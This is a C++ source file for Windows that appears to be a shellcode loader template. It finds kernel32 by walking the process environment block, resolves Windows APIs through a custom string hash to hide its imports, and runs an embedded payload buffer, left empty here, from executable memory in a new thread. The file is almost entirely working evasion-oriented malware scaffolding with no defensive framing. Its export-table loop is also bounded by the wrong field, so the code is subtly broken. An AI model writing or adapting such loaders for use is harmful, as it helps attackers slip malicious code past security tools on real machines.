#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING 
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
}UNICODE_STRING;

struct LDR_MODULE
{
	LIST_ENTRY      e[3];
	HMODULE			base; 
	void*		   entry;
	UINT			size;
	UNICODE_STRING	dllPath;
	UNICODE_STRING  dllName;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)
(
	LPCSTR lpModuleName
);

typedef FARPROC(WINAPI* fnGetProcAddress)
(
	HMODULE hModule,
	LPCSTR  lpProcName
);

typedef PVOID(WINAPI* fnVirtualAlloc)
(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

typedef PVOID(WINAPI* fnCreateThread)
(
	LPSECURITY_ATTRIBUTES	lpThreadAttributes,
	SIZE_T					dwStackSize, 
	LPTHREAD_START_ROUTINE	lpStartAddress,
	LPVOID					lpParameter,
	DWORD					dwCreationFlags,
	LPDWORD					lpThreadId
);

typedef PVOID(WINAPI* fnWaitForSingleObject)
(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

DWORD calcMyHash(char* data)
{
	DWORD hash = 0x35;
	for (int i = 0; i < strlen(data); i++)
	{
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll)
{
	char	name[64];
	size_t	i = 0;

	while (mdll->dllName.Buffer[i] && i < sizeof(name) - 1)
	{
		name[i] = (char)mdll->dllName.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcMyHash((char*)CharLowerA(name));
}

static HMODULE getKernel32(DWORD myHash)
{
	HMODULE		kernel32;
	// __readgsqword() == solo esta disponible en arquitectura x64
	INT_PTR		peb     = __readgsqword(0x60);
	auto	modList     = 0x18;
	auto modListFlink   = 0x18;
	auto kernelBaseAddr = 0x10;

	auto mdllist		= *(INT_PTR*)(peb + modList);
	auto mlink          = *(INT_PTR*)(mdllist + modListFlink);
	auto krnbase        = *(INT_PTR*)(mlink + kernelBaseAddr);
	auto mdl            = (LDR_MODULE*)mlink;

	do
	{
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		if (mdl->base != nullptr)
		{
			if (calcMyHashBase(mdl) == myHash)
			{
				break;
			}
		}
	} while (mlink != (INT_PTR)mdl);

	kernel32 = (HMODULE)mdl->base;
	return kernel32;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash)
{
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header  = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt  = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD					   fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD					  fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
	PWORD					  fOrd   = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++)
	{
		LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
		if (calcMyHash(pFuncName) == myHash)
		{
			printf("Successfully found! %s - %d \n", pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

unsigned char my_payload[] = "";

int main()
{
	HMODULE                           mod		 = getKernel32(56369259);
	fnGetModuleHandleA myGetModuleHandleA		 = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
	fnGetProcAddress   myGetProcAddress			 = (fnGetProcAddress)getAPIAddr(mod, 448915681);
	HMODULE							hk32		 = myGetModuleHandleA("kernel32.dll");
	fnVirtualAlloc	       myVirtualAlloc		 = (fnVirtualAlloc)myGetProcAddress(hk32, "VirtualAlloc");
	fnCreateThread         myCreateThread		 = (fnCreateThread)myGetProcAddress(hk32, "CreateThread");
	fnWaitForSingleObject  myWaitForSingleObject = (fnWaitForSingleObject)myGetProcAddress(hk32, "WaitForSingleObject");

	PVOID lb  = myVirtualAlloc(0, sizeof(my_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = myCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
	myWaitForSingleObject(th, INFINITE);
}
